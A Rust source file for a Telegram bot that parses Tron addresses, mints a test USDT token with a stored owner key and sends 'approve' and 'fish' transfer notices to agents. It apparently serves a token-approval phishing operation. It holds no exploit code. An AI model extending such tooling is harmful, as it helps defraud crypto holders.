use std::str::FromStr;

use kameo::{Actor, actor::ActorRef, error::RegistryError, mailbox::unbounded};
use reqwest::Client;
use teloxide::{
    Bot,
    dispatching::{HandlerExt, UpdateFilterExt},
    dptree,
    prelude::{Dispatcher, Requester, ResponseResult},
    types::{Message, Update},
    utils::command::BotCommands,
};
use thiserror::Error;
use tokio::task::JoinHandle;
use tracing::error;

use crate::{
    options::options_cache,
    telegram_bot::command::Command,
    tron::{block::BlockBrief, tron_block_scanner::TronBlockScanner},
    utils::{
        now_date_time_str,
        tron::{TronPublicKeyBundle, make_transaction_details_url, send_transaction},
    },
};

#[derive(Debug, Error)]
pub enum TelegramBotManagerError {
    #[error("未配置Bot api key")]
    NoBotKey,
    #[error("registry error: {0}")]
    RegistryError(#[from] RegistryError),
}

pub(crate) struct TelegramBotManager {
    bot_handler: Option<JoinHandle<()>>,
    bot: Bot,
}

impl TelegramBotManager {
    pub(crate) async fn spawn_link(
        supervisor: &ActorRef<impl Actor>,
    ) -> anyhow::Result<ActorRef<Self>> {
        let token = if let Some(key) = options_cache::map_bot_key(|m| m.value.clone()).flatten() {
            key
        } else {
            return Err(TelegramBotManagerError::NoBotKey.into());
        };

        let bot = teloxide::Bot::new(token);
        let manager = TelegramBotManager::new(bot);
        let actor_ref =
            Actor::spawn_link_with_mailbox(supervisor, manager, unbounded::<Self>()).await;
        let _ = actor_ref
            .wait_for_startup_with_result(|r| match r {
                Ok(_) => Ok(()),
                Err(e) => {
                    anyhow::bail!(format!("{e:?}"))
                }
            })
            .await?;

        Ok(actor_ref)
    }

    pub async fn bot() -> anyhow::Result<Option<Bot>> {
        let me = Self::me()?;
        if let Some(actor_ref) = me {
            match actor_ref.ask(GetBotCmd).await {
                Ok(bot) => Ok(Some(bot)),
                Err(e) => anyhow::bail!("{e:?}"),
            }
        } else {
            Ok(None)
        }
    }

    pub fn me() -> anyhow::Result<Option<ActorRef<Self>>> {
        let actor_ref = ActorRef::lookup(<Self as Actor>::name())?;

        Ok(actor_ref)
    }

    fn new(bot: Bot) -> TelegramBotManager {
        TelegramBotManager {
            bot_handler: None,
            bot,
        }
    }
}

impl Actor for TelegramBotManager {
    type Args = Self;

    type Error = TelegramBotManagerError;

    async fn on_start(
        mut args: Self::Args,
        actor_ref: kameo::prelude::ActorRef<Self>,
    ) -> Result<Self, Self::Error> {
        actor_ref.register(Self::name())?;
        args.start_bot(&actor_ref).await?;

        Ok(args)
    }
}

impl TelegramBotManager {
    async fn start_bot(
        &mut self,
        _actor_ref: &ActorRef<Self>,
    ) -> Result<(), TelegramBotManagerError> {
        error!("enter start bot");
        let mut deps = dptree::di::DependencyMap::new();
        deps.insert(Client::new());
        let handler = dptree::entry()
            .branch(
                Update::filter_message()
                    .filter_command::<Command>()
                    .endpoint(Self::handle_command),
            )
            .branch(Update::filter_message().endpoint(Self::handle_message));
        let mut dispatcher = Dispatcher::builder(self.bot.clone(), handler)
            .dependencies(deps)
            .build();

        let handler = tokio::spawn(async move {
            error!("启动机器人");
            dispatcher.dispatch().await;
        });
        self.bot_handler.replace(handler);

        Ok(())
    }
}

impl TelegramBotManager {
    async fn handle_message(bot: Bot, msg: Message) -> ResponseResult<()> {
        if let Some(text) = msg.text() {
            bot.send_message(msg.chat.id, text).await?;
        }

        Ok(())
    }

    async fn handle_command(
        bot: Bot,
        msg: Message,
        command: Command,
        client: Client,
    ) -> ResponseResult<()> {
        match command {
            Command::Help => {
                bot.send_message(msg.chat.id, Command::descriptions().to_string())
                    .await?;
            }
            Command::Id => {
                bot.send_message(msg.chat.id, msg.chat.id.0.to_string())
                    .await?;
            }
            Command::Mint { to, amount } => {
                Self::handle_mint_command(bot, msg, client, to, amount).await?;
            }
            Command::ParseTronAddress(maybe_address) => {
                match anychain_tron::TronAddress::from_str(&maybe_address) {
                    Ok(addr) => {
                        let base58 = addr.to_base58();
                        let hex = addr.to_hex();
                        bot.send_message(msg.chat.id, format!("base58: {}, hex: {}", base58, hex))
                            .await?;
                        //
                    }
                    Err(e) => {
                        bot.send_message(msg.chat.id, format!("不是合法的Tron地址: {e:?}"))
                            .await?;
                    }
                }
            }
            Command::TestApproveNotice => {
                let now = now_date_time_str();
                let _ = TronBlockScanner::send_approve_bot_message_with_bot(
                    &bot,
                    msg.chat.id,
                    "test daili",
                    "Tskfjkdsjjl[Test]",
                    "TestPersmission",
                    "授权成功",
                    "授权成功",
                    Some(10000),
                    Some(100000),
                    &now,
                )
                .await;
            }
            Command::TestTransferNotice => {
                // 测试转帐通知
                let now = now_date_time_str();
                let _ = TronBlockScanner::send_transfer_fish_usdt_notice_with_bot(
                    &bot,
                    msg.chat.id,
                    "Fish Address",
                    &Some("测试代理".to_string()),
                    // &Some("代理收款地址".to_string()),
                    None,
                    1_000_000,
                    Some(1000000),
                    &now,
                )
                .await;
            }
        }

        Ok(())
    }
}

impl TelegramBotManager {
    async fn handle_mint_command(
        bot: Bot,
        msg: Message,
        client: Client,
        to: String,
        amount: u64,
    ) -> ResponseResult<()> {
        let secret = options_cache::map_contract_owner_private_key(|m| m.value.clone()).flatten();
        let secret = match secret {
            Some(s) => s,
            None => {
                bot.send_message(msg.chat.id, "未配置授权地址密钥，将不会执行")
                    .await?;
                return Ok(());
            }
        };
        let owner_pubkey = match crate::utils::tron::private_key_2_public_key(&secret) {
            Ok(TronPublicKeyBundle { base58, .. }) => base58,
            Err(e) => {
                bot.send_message(
                    msg.chat.id,
                    format!("私钥转公钥出错：{e:?},命令将不会被执行"),
                )
                .await?;
                return Ok(());
            }
        };
        let BlockBrief { block_id, number } = match crate::tron::block::get_block_brief().await {
            Some(b) => b,
            None => {
                bot.send_message(msg.chat.id, "还未初始化区块信息，命令不会被执行")
                    .await?;
                return Ok(());
            }
        };
        match crate::utils::tron::build_mint_test_usdt(
            &owner_pubkey,
            &to,
            amount,
            number as i64,
            &block_id,
            &secret,
        ) {
            Ok(tx) => {
                let ret = send_transaction(&client, tx).await;
                let full_host = &config_helper::CONFIG.tron.full_host;
                match ret {
                    Ok(resp) => {
                        if resp.success() {
                            let details_url = make_transaction_details_url(full_host, &resp.tx_id);
                            bot.send_message(
                                msg.chat.id,
                                format!(
                                    "命令执行成功, 交易id: {}, code: {:?}, 交易消息: {:?} url: {full_host}， 交易详情: {details_url}",
                                    resp.tx_id,
                                    resp.code,
                                    resp.message,

                                ),
                            )
                            .await?;
                        }
                    }
                    Err(e) => {
                        bot.send_message(
                            msg.chat.id,
                            format!("发送交易出错, url: {full_host}, 错误: {e:?}"),
                        )
                        .await?;
                    }
                }
            }
            Err(e) => {
                bot.send_message(
                    msg.chat.id,
                    format!("构建交易出错：{e:?}, 命令将不会被执行"),
                )
                .await?;
            }
        }

        Ok(())
    }
}

struct GetBotCmd;

impl kameo::message::Message<GetBotCmd> for TelegramBotManager {
    type Reply = Result<Bot, ()>;

    async fn handle(
        &mut self,
        _msg: GetBotCmd,
        _ctx: &mut kameo::prelude::Context<Self, Self::Reply>,
    ) -> Self::Reply {
        Ok(self.bot.clone())
    }
}
